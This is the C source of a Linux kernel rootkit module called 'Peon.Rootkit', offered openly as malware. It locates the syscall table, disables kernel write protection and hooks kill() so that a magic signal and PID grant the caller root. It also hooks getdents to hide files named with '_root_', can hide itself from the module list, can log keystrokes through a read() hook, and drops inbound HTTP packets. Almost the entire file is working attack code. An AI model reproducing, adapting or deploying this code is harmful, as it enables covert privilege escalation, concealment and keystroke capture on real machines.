#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/limits.h>
#include <linux/proc_fs.h>

#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <asm/errno.h>
#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>


//#define HOOK_READ
//#define HIDE_MODULE
#define NETWORK
#define DEBUG
#define SIG_4_ROOT 9
#define PID_4_ROOT 88888
#define SIG_4_SHOW_MOD 9
#define PID_4_SHOW_MOD 22222
#define ETH_P_ALL       0x0003

#if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
#define OS_64_BITS
#define KERN_MEM_BEGIN 0xffffffff81000000
#define KERN_MEM_END 0xffffffff81e42000

#else	/* 32 bits machine */
#define KERN_MEM_BEGIN 0xc0000000	//11000000 00000000 00000000 00000000
#define KERN_MEM_END 0xd0000000		//11010000 00000000 00000000 00000000
#endif 


static struct kmem_cache *cred_jar;

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen;
	char            d_name[1];
};

unsigned long long file_saved_offset=0;

//(filename, O_RDONLY, 0);
struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file* file) {
    filp_close(file, NULL);
}

int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}   

int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file* file) {
    vfs_fsync(file, 0);
    return 0;
}

char append_filez(const char *path_file,unsigned char * data,unsigned int size){
struct file* fd=NULL;
int error;
fd=file_open(path_file, O_WRONLY|O_CREAT, 0644);
if (fd==NULL)
	return -1;

error=file_write(fd, file_saved_offset, data, size);
//if(!error);

	file_saved_offset+=size;
	file_close(fd);
	return 0;

}

unsigned long **find_syscall_table(void)
{
	/*  Find the syscall table 
	*  search in memory the adress of a function of the syscall table (sys_close)
	*/
	unsigned long **sctable;
	unsigned long int i = KERN_MEM_BEGIN;

	while ( i < KERN_MEM_END) {

		sctable = (unsigned long **)i;

		if ( sctable[__NR_close] == (unsigned long *) sys_close) {

			return &sctable[0];

		}

		i += sizeof(void *);
	}

	return NULL;     
}



void disable_wp(void){

#if defined(OS_64_BITS) 

	__asm__("push   %rax\n\t"
		"mov    %cr0,%rax;\n\t"
		"and     $~(1 << 16),%rax;\n\t"
		"mov    %rax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %rax"
		);
#else

	__asm__("push   %eax\n\t"
		"mov    %cr0,%eax;\n\t"
		"and     $~(1 << 16),%eax;\n\t"
		"mov    %eax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %eax"
		);  
#endif     
}

void enable_wp(void){

#if defined(OS_64_BITS) 

	__asm__("push   %rax\n\t"
		"mov    %cr0,%rax;\n\t"
		"or     $(1 << 16),%rax;\n\t"
		"mov    %rax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %rax"
		);

#else
	__asm__("push   %eax\n\t"
		"mov    %cr0,%eax;\n\t"
		"or     $(1 << 16),%eax;\n\t"
		"mov    %eax,%cr0;\n\t"
		"wbinvd\n\t"
		"pop    %eax"
		); 
#endif       
}




/* Adress of the syscall table */
unsigned long ** syscall_table ;

//flag: hide module
char FIRST_SHOW_MODULE = 1;

char keys[5]={0};

/* save packet type */
struct packet_type pt;

/* save module */
struct module *mod;


/*
Three byte keys:
#################

UpArrow:     0x1B 0x5B 0X41
DownArrow:   0x1B 0x5B 0X42
RightArrow:  0x1B 0x5B 0x43
LeftArrow:   0x1b 0x5B 0x44
Beak(Pause): 0x1b 0x5B 0x50


Four byte keys:
################

F1:          0x1b 0x5B 0x5B 0x41
F2:          0x1b 0x5B 0x5B 0x42
F3:          0x1b 0x5B 0x5B 0x43
F4:          0x1b 0x5B 0x5B 0x44
F5:          0x1b 0x5B 0x5B 0x45
Ins:         0x1b 0x5B 0x32 0x7E
Home:        0x1b 0x5B 0x31 0x7E
PgUp:        0x1b 0x5B 0x35 0x7E
Del:         0x1b 0x5B 0x33 0x7E
End:         0x1b 0x5B 0x34 0x7E
PgDn:        0x1b 0x5B 0x36 0x7E


Five byte keys:
################

F6:          0x1b 0x5B 0x31 0x37 0x7E
F7:          0x1b 0x5B 0x31 0x38 0x7E
F8:          0x1b 0x5B 0x31 0x39 0x7E
F9:          0x1b 0x5B 0x32 0x30 0x7E
F10:         0x1b 0x5B 0x32 0x31 0x7E
F11:         0x1b 0x5B 0x32 0x33 0x7E
F12:         0x1b 0x5B 0x32 0x34 0x7E
*/

void check_keyboard_buf(char __user *buf){
	u16 index=0;
	while(buf[index]!=0x00 && index<50){
		if (buf[index]==0x9)
			printk(KERN_ALERT "Peon.Rootkit: keyboard = {TAB}");
		else if (buf[index]==0x7f)
			printk(KERN_ALERT "Peon.Rootkit: keyboard = {BACKSPACE}");
		else if (buf[index]==0x0d)
			printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}");
		else if (buf[index]==0x0a)
			printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}");
		else
			printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n",index,buf[index],buf[index]);
		index++;
			}

}



#ifdef HOOK_READ
	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
		
		long ret = orig_read_call( fd, buf, count);
		if (fd==0){
		check_keyboard_buf(buf);

		}
		return  ret;
	} 
#endif


#if defined(OS_64_BITS) 
/* -------------------------- 64 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents) (unsigned int fd,  struct linux_dirent __user *dirent,  unsigned int count);
asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *dirent, unsigned int count){

	int ret= orig_getdents( fd,  dirent, count);
	{

		unsigned long off = 0;
		struct linux_dirent __user *dir;	

		/* list directory  and hide files containing name _root_ */
		for(off=0;off<ret;){

			dir=(void*)dirent+off;
			/* hide files containing name _root_ */	
			if((strstr(dir->d_name, "_root_")) != NULL){
				printk(KERN_ALERT "Peon.Rootkit: hide.64 %s",dir->d_name);
				ret-=dir->d_reclen;
				if(dir->d_reclen+off<ret)
					memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
			}
			else
				off += dir->d_reclen;
		}
	}
	return ret;
}
#else

/* -------------------------- 32 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents64) (unsigned int fd,  struct linux_dirent64 __user *dirent,  unsigned int count);
asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __user *dirent, unsigned int count){

	int ret= orig_getdents64( fd,  dirent, count);
	{

		unsigned long off = 0;
		struct linux_dirent64 __user *dir;	

		/* list directory  and hide files containing name _root_ */
		for(off=0;off<ret;){

			dir=(void*)dirent+off;
			/* hide files containing name _root_ */	
			if((strstr(dir->d_name, "_root_")) != NULL){
				printk(KERN_ALERT "Peon.Rootkit: hide %s",dir->d_name);
				ret-=dir->d_reclen;
				if(dir->d_reclen+off<ret)
					memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));
			}
			else
				off += dir->d_reclen;
		}
	}
	return ret;
}
#endif

asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
asmlinkage long kill_hook_call( pid_t pid, int sig){

	/* Hacked function : kill -88 88*/ 
	if((sig ==SIG_4_ROOT) &&(pid==PID_4_ROOT))
	{
		struct task_struct *cur_task;
		const struct cred *old;
		struct cred *credz;

		cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
		credz = kmem_cache_alloc(cred_jar, GFP_KERNEL);
		if (!credz){
			#ifdef DEBUG
			printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  bug alloc");
			#endif
			return kill_orig_call(pid,sig);
		}
		/* obtain root access in shell*/
		cur_task=current;
		/**/
		old = cur_task->cred;

		/* remove warning const */
		memcpy(credz, old, sizeof(struct cred));
		credz->uid=0;
		credz->gid=0;
		credz->suid=0;
		credz->sgid=0;
		credz->euid=0;
		credz->egid=0; 
		cur_task->cred=credz;
		#ifdef DEBUG
		printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  shell root access");
		#endif
		kfree(old);
	}

	/*   show hided module  kill -22 22*/    
	if((sig ==SIG_4_SHOW_MOD) &&(pid==PID_4_SHOW_MOD) && FIRST_SHOW_MODULE){  
		FIRST_SHOW_MODULE=0; // only one try
		/*  attach save module to the list of module by seaching snd module */    	
		list_add(&mod->list,&find_module("snd")->list);   
		#ifdef DEBUG		
		printk(KERN_ALERT "Peon.Rootkit: show module");
		#endif
	}
	return kill_orig_call(pid,sig);
}


/* -------------------------------------------------------------------- */

int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
{
	if(skb->pkt_type == PACKET_HOST){
		struct iphdr *ip;
		ip=(struct iphdr*)skb_network_header(skb);
		if(ip->version ==4 && ip->protocol ==  IPPROTO_TCP ){
			struct tcphdr *tcp_hdr;
			//tcp_hdr=tcp_hdr(skb);
			tcp_hdr=(struct tcphdr *)(ip->ihl * 4 + skb->data);
			/* check if source port is from http */
			if(tcp_hdr->source==ntohs(80) || tcp_hdr->source==ntohs(8080)){
				#ifdef DEBUG
				int i=0;
				int size=0;
				printk(KERN_ALERT "Peon.Rootkit: http");
				printk(KERN_ALERT "Peon.Rootkit: skb data len %d",skb->data_len);
				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d",skb->mac_len);
				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d",skb->hdr_len);
				printk(KERN_ALERT "data : %s",skb->data);
				/*if(skb->data_len==0)
				size=skb->len;
				else
				size=skb->len - skb->data_len;
				for(;i<16;i++)
					printk(KERN_ALERT "0x%x,",skb->data[i]);*/
				
				#endif
				kfree_skb(skb);
			}
		}
	}
	return 0;
}

int init_module(void)
{

	syscall_table = find_syscall_table();

	if (syscall_table == 0){
	#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit: System call table found!\n");
	#endif
		return 1;
	}
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
	#endif
	
	#ifdef HIDE_MODULE
	/*  hide module  lsmod */ 
	//save module   
	mod=THIS_MODULE;
	list_del(&THIS_MODULE->list);
		#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit is hidden\n");
		#endif
	#else
	FIRST_SHOW_MODULE=0;
		#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit is un-hidden\n");
		#endif
	#endif

	disable_wp();

	/*  Save the adress of the original kill syscall */
	kill_orig_call= (void *) syscall_table[__NR_kill];

	/*  Replace the syscall in the table */
	syscall_table[__NR_kill] = (void*) kill_hook_call;


#if defined(OS_64_BITS) 

	#ifdef DEBUG	
	printk(KERN_INFO "Peon.Rootkit is in 64 bits\n");
	#endif
	/*  Save the adress of the original getdents syscall */
	orig_getdents= (void *) syscall_table[__NR_getdents];

	/*  Replace the syscall in the table */
	syscall_table[__NR_getdents] = (void*) hacked_getdents;


#else
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is in 32 bits\n");
	#endif
	/*  Save the adress of the original getdents64 syscall */
	orig_getdents64= (void *) syscall_table[__NR_getdents64];

	/*  Replace the syscall in the table */
	syscall_table[__NR_getdents64] = (void*) hacked_getdents64;

#endif

#ifdef NETWORK
	//remove interfacepacket layer2
	__dev_remove_pack( &pt ); 
	// stuff for network, call "dev_func" function  
	pt.type = htons(ETH_P_ALL);
	// pt.dev = 0;
	pt.func = dev_func;
	dev_add_pack(&pt);
		#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
		#endif
#endif

#ifdef HOOK_READ
	/*  Save the adress of the original read syscall */
	orig_read_call= (void *) syscall_table[__NR_read];

	/*  Replace the syscall in the table */
	syscall_table[__NR_read] = (void*) hook_read_call;

	#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit: HooKeD Read!\n");
		#endif
#endif

	enable_wp(); 
	
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is loaded!\n");
	#endif
	
	return 0;
}

void cleanup_module(void)
{

	disable_wp();

	/* Set the orignal call*/ 
	syscall_table[__NR_kill ] = (void*) kill_orig_call;

	#ifdef HOOK_READ
	syscall_table[ __NR_read ] = (void*) orig_read_call;
	#endif

	#if defined(OS_64_BITS)  
		syscall_table[ __NR_getdents] = (void*) orig_getdents;
	#else
		syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
	#endif
	
	#ifdef NETWORK
	//remove interfacepacket layer2
	__dev_remove_pack( &pt ); 

		#ifdef DEBUG
		printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
		#endif
	#endif

	enable_wp(); 
	
	#ifdef DEBUG
	printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
	#endif
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peondusud");
MODULE_DESCRIPTION("peondusud rootkit module");
